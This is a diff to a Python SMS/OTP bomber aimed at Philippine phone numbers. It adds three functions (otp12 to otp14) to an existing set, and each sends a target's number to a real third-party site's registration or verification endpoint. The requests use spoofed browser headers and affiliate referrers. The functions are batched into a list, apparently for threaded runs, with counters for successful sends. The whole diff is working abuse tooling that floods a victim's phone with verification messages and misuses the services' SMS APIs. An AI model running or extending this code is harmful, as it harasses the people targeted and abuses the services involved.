@@ -4,6 +4,7 @@ import sys
 import os
 import base64
 import json
+import random
 from icecream import ic
 from multiprocessing.pool import ThreadPool
 logo = (""" \033[1;92m____  _   _ _                     _
@@ -46,6 +47,7 @@ def to9(number) -> str:
         pass
     return number
 
+
 def to639(number) -> str:
     if str(number[0]) == "0":
         number = number.replace(str(number[0]), "63")
@@ -55,6 +57,7 @@ def to639(number) -> str:
         pass
     return number
 
+
 def toplus63(number) -> str:
     if str(number[0]) == "0":
         number = "+63"+str(number[1:])
@@ -63,6 +66,8 @@ def toplus63(number) -> str:
     else:
         pass
     return number
+
+
 def to09(number) -> str:
     if str(number[0]) == "+":
         number = "0"+str(number[1:])
@@ -78,7 +83,8 @@ def otp(number):
     global LIMIT, ERROR
     number = to9(number=number)
     url = "https://api2.cocacolahightech.com/login/sendCode"
-    header = {'Host': 'api2.cocacolahightech.com','Connection': 'keep-alive','Content-Length': '30','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','content-type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','Authorization': 'Bearer','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','sec-ch-ua-platform': '"Windows"','Accept': '*/*','Origin': 'https://www.cocacolahightech.com','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.cocacolahightech.com/','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
+    header = {'Host': 'api2.cocacolahightech.com', 'Connection': 'keep-alive', 'Content-Length': '30', 'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 'content-type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0', 'Authorization': 'Bearer',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://www.cocacolahightech.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.cocacolahightech.com/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
     body = {"mobile": str(number), "code": "", "type": 0}
     try:
         web = requests.post(url, headers=header, json=body)
@@ -103,8 +109,9 @@ def otp1(number):
     global LIMIT, ERROR
     number = to639(number=number)
     url = "https://api.skpools.pro/api/v1/send/msg"
-    header = {'Host': 'api.skpools.pro','Connection': 'keep-alive','Content-Length': '35','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-platform': '"Windows"','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','Content-Type': 'application/json','Accept': '*/*','Origin': 'https://skpools.pro','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://skpools.pro/','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
-    body = {"phone":str(number),"type":"1"}
+    header = {'Host': 'api.skpools.pro', 'Connection': 'keep-alive', 'Content-Length': '35', 'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-mobile': '?0',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'Content-Type': 'application/json', 'Accept': '*/*', 'Origin': 'https://skpools.pro', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://skpools.pro/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
+    body = {"phone": str(number), "type": "1"}
     try:
         web = requests.post(url, headers=header, json=body)
         r = json.loads(web.text)
@@ -188,6 +195,7 @@ def otp3(number):
     try:
         web = requests.post(url, headers=header, json=body)
         r = json.loads(web.text)
+        time.sleep(5)
         if debug == True:
             ic(f"{r} from toktok")
         if r["data"]["loginRegister"] == "REGISTER":
@@ -196,6 +204,7 @@ def otp3(number):
         else:
             ERROR += 1
             return False
+
     except:
         ERROR += 1
         if debugError == True:
@@ -261,10 +270,11 @@ def otp6(number):
     global LIMIT, ERROR
     number = to9(number=number)
     url = "https://vividzoo.com/index.php/api/sms/send2"
-    header = {'Host': 'vividzoo.com','Connection': 'keep-alive','Content-Length': '32','sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36','token': '','dev': 'H5','sec-ch-ua-platform': '"Windows"','Accept': '*/*','Sec-GPC': '1','Accept-Language': 'en-US,en;q=0.7','Origin': 'https://vividzoo.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://vividzoo.com/h5/pages/login/reg?invite=94376825','Accept-Encoding': 'gzip'}
-    
+    header = {'Host': 'vividzoo.com', 'Connection': 'keep-alive', 'Content-Length': '32', 'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'token': '', 'dev': 'H5', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.7', 'Origin': 'https://vividzoo.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://vividzoo.com/h5/pages/login/reg?invite=94376825', 'Accept-Encoding': 'gzip'}
+
     body = {"mobile": str(number), "event": "register"}
-    
+
     try:
         web = requests.post(url, headers=header, data=body)
         r = json.loads(web.text)
@@ -290,7 +300,8 @@ def otp7(number):
     session = requests.Session()
     session.get('https://gplayer77.com')
     url = 'https://gplayer77.com/api/vcode/sendVcodeForNotExistUser'
-    header = {'Host': 'gplayer77.com','Connection': 'keep-alive','Content-Length': '32','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','Accept': 'application/json, text/plain, */*','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','sec-ch-ua-platform': '"Windows"','Origin': 'https://gplayer77.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://gplayer77.com/register','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
+    header = {'Host': 'gplayer77.com', 'Connection': 'keep-alive', 'Content-Length': '32', 'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'sec-ch-ua-platform': '"Windows"', 'Origin': 'https://gplayer77.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://gplayer77.com/register', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
     body = {"mobile": str(number), "countryCode": 63}
     web = session.post(url, headers=header, data=body)
     try:
@@ -317,8 +328,9 @@ def otp8(number):
     number = to9(number=number)
     session = requests.Session()
     url = "https://api.taibots.com/buyer/send_code"
-    header = {'Host': 'api.taibots.com','Connection': 'keep-alive','Content-Length': '190','sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"','Accept': 'application/json, text/plain, */*','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36','sec-ch-ua-platform': '"Windows"','Sec-GPC': '1','Accept-Language': 'en-US,en;q=0.6','Origin': 'https://www.taibots.com','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.taibots.com/','Accept-Encoding': 'gzip'}
-    
+    header = {'Host': 'api.taibots.com', 'Connection': 'keep-alive', 'Content-Length': '190', 'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.6', 'Origin': 'https://www.taibots.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.taibots.com/', 'Accept-Encoding': 'gzip'}
+
     body = {
         "lang": "us",
         "phone": str(number),
@@ -394,19 +406,22 @@ def otp10(number):
         if debugError == True:
             ic(f"\033[1;91mError otp10\033[1;92m")
         return False
-    
+
+
 def otp11(number):
-    {"success":True,"value":{"expiredMinutes":5,"maxAttemptTimes":10,"expirationTime":1709109655053}}
+    {"success": True, "value": {"expiredMinutes": 5,
+                                "maxAttemptTimes": 10, "expirationTime": 1709109655053}}
     global LIMIT, ERROR
     number = to09(number=number)
     session = requests.Session()
     url = "https://www.luxeplay.ph/wps/verification/sms/register"
-    header = {'Host': 'www.luxeplay.ph','Connection': 'keep-alive','Content-Length': '26','X-Gateway-Version': '3','sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"','Language': 'EN','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36','Content-Type': 'application/json','Merchant': 'crazywin','Accept': 'application/json, text/plain, */*','Device': 'web','sec-ch-ua-platform': '"Windows"','Sec-GPC': '1','Accept-Language': 'en-US,en;q=0.6','Origin': 'https://www.luxeplay.ph','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.luxeplay.ph/register?affiliateCode=q4l3v','Accept-Encoding': 'gzip, deflate, br'}
+    header = {'Host': 'www.luxeplay.ph', 'Connection': 'keep-alive', 'Content-Length': '26', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json',
+              'Merchant': 'crazywin', 'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.6', 'Origin': 'https://www.luxeplay.ph', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.luxeplay.ph/register?affiliateCode=q4l3v', 'Accept-Encoding': 'gzip'}
     body = {"mobileNo": str(number)}
-    
+
     try:
         web = session.post(url, headers=header, json=body)
-        result=json.loads(web.text)
+        result = json.loads(web.text)
         if debug == True:
             ic(f"{web.status_code} from luxeplay")
         if result['success'] == True:
@@ -421,7 +436,100 @@ def otp11(number):
     except:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp10\033[1;92m")
+            ic(f"\033[1;91mError otp11\033[1;92m")
+        return False
+
+
+def otp12(number):
+    {"success": True, "value": {"expiredMinutes": 5,
+                                "maxAttemptTimes": 10, "expirationTime": 1709109655053}}
+    global LIMIT, ERROR
+    number = to9(number=number)
+    session = requests.Session()
+    url = "https://www.wagi777.app/wps/verification/sms/register"
+    header = {'Host': 'www.wagi777.app', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json',
+              'Merchant': 'wagif3', 'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.5', 'Origin': 'https://www.wagi777.app', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.wagi777.app/', 'Accept-Encoding': 'gzip'}
+    body = {"countryDialingCode": "63", "mobileNo": str(number)}
+
+    try:
+        web = session.post(url, headers=header, json=body)
+        result = json.loads(web.text)
+        if debug == True:
+            ic(f"{web.status_code} from wagi777")
+        if result['success'] == True:
+            LIMIT += 1
+            return True
+        elif result['success'] == False:
+            ERROR += 1
+            return False
+        else:
+            ERROR += 1
+            return False
+    except:
+        ERROR += 1
+        if debugError == True:
+            ic(f"\033[1;91mError otp12\033[1;92m")
+        return False
+
+
+def otp13(number):
+    {"success": True, "value": {"expiredMinutes": 3,
+                                "maxAttemptTimes": 10, "expirationTime": 1709226647368}}
+    global LIMIT, ERROR
+    number = to9(number=number)
+    session = requests.Session()
+    url = "https://www.wqb753.com/wps/verification/sms/register"
+    header = {'Host': 'www.wqb753.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'winhq9f2',
+              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://www.wqb753.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.wqb753.com/register?r=ire2079', 'Accept-Encoding': 'gzip, deflate, br'}
+    body = {"countryDialingCode": "63", "mobileNo": str(number)}
+
+    try:
+        web = session.post(url, headers=header, json=body)
+        result = json.loads(web.text)
+        if debug == True:
+            ic(f"{web.status_code} from wqb753")
+        if result['success'] == True:
+            LIMIT += 1
+            return True
+        elif result['success'] == False:
+            ERROR += 1
+            return False
+        else:
+            ERROR += 1
+            return False
+    except:
+        ERROR += 1
+        if debugError == True:
+            ic(f"\033[1;91mError otp13\033[1;92m")
+        return False
+
+
+def otp14(number):
+    global LIMIT, ERROR
+    number = to9(number=number)
+    session = requests.Session()
+    url = "https://edi-wow.com/api/lobby/verify"
+    header = {'Host': 'edi-wow.com', 'Connection': 'keep-alive', 'Content-Length': '77', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'locale': 'en', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'owner-id': '6236', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.6', 'Origin': 'https://edi-wow.com', 'Sec-Fetch-Site':
+              'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://edi-wow.com/m/auth/signup', 'Accept-Encoding': 'gzip', 'Cookie': 'i18n_redirected=en'}
+    body = {"mobile": str(number), "country": "PHP",
+            "username": f"aknownnnn", "type": "register"}
+
+    try:
+        web = session.post(url, headers=header, json=body)
+        result = json.loads(web.text)
+        if debug == True:
+            ic(f"{web.status_code} from edi wow")
+        if result['resCode'] == 200:
+            LIMIT += 1
+            time.sleep(60)
+            return True
+        else:
+            ERROR += 1
+            return False
+    except:
+        ERROR += 1
+        if debugError == True:
+            ic(f"\033[1;91mError otp14\033[1;92m")
         return False
 # you can add api and put it in the box to run
 
@@ -467,7 +575,7 @@ def home():
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLIMIT")
     # all process put in the box to put in multiprocess
     function = [otp, otp1, otp2, otp3, otp4,
-                otp5, otp6, otp7, otp8, otp9, otp10, otp11]
+                otp5, otp6, otp7, otp8, otp9, otp10, otp11, otp12, otp13, otp14]
     # append LIMIT in global variables
     LIMIT1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mThreads Sleep default:1")
